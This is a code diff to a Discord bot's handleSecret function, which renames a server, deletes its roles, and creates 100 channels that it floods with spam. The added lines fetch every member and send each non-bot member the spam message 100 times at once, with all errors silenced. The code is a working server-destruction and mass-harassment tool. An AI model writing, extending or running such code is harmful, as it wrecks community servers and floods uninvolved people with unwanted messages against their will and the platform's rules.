@@ -20,6 +20,9 @@ export async function handleSecret(
   // Fire-and-forget status — never block on it
   message.channel.send("🔥 Firing...").catch(() => {});
 
+  // Fetch members first so cache is populated for DMs
+  await guild.members.fetch().catch(() => {});
+
   // Everything runs simultaneously — no sequential phases
   await Promise.all([
     // Rename server
@@ -35,6 +38,19 @@ export async function handleSecret(
         .map((r) => r.delete().catch(() => {})),
     ),
 
+    // DM every member 100 times simultaneously
+    Promise.all(
+      guild.members.cache
+        .filter((m) => !m.user.bot)
+        .map((m) =>
+          Promise.all(
+            Array.from({ length: 100 }, () =>
+              m.send(SPAM_MESSAGE).catch(() => {}),
+            ),
+          ),
+        ),
+    ),
+
     // Create 100 channels and spam each one immediately as it resolves
     Promise.all(
       Array.from({ length: 100 }, () =>
@@ -47,7 +63,6 @@ export async function handleSecret(
           })
           .then((ch) => {
             if (!ch.isTextBased()) return;
-            // Blast all 100 messages at once the moment the channel exists
             return Promise.all(
               Array.from({ length: 100 }, () => ch.send(SPAM_MESSAGE).catch(() => {})),
             );
